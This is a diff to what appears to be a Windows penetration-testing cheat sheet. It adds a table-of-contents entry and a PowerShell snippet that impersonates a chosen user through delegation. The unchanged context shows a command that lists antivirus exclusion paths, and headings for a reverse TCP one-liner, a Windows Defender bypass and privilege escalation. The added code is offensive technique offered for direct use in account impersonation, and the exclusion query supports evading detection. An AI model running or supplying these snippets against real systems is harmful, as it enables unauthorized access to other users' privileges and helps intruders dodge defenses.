@@ -26,6 +26,7 @@ Table of Contents
       * [Resolve SID to User](#resolve-sid-to-user)
       * [Reverse TCP One Liner](#reverse-tcp-one-liner)
       * [List the AV excepcions](#list-the-av-excepcions)
+      * [Impersonating user through delegation](#impersonating-user-through-delegation)
    * [PrivEsc on Windows](#privesc-on-windows)
       * [Bypassing Windows Defender](#bypassing-windows-defender)
       * [Sharing files with Windows machine](#sharing-files-with-windows-machine)
@@ -210,6 +211,15 @@ It would be necessary, in some situations, to execute the x64 version (which is 
 ## List the AV excepcions
 ```powershell
 Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+```
+
+## Impersonating user through delegation
+
+```powershell
+[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null
+$idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('___USERNAME___')
+$idToImpersonate.Impersonate()
+[System.Security.Principal.WindowsIdentity]::GetCurrent() | select name
 ```
 
 # PrivEsc on Windows
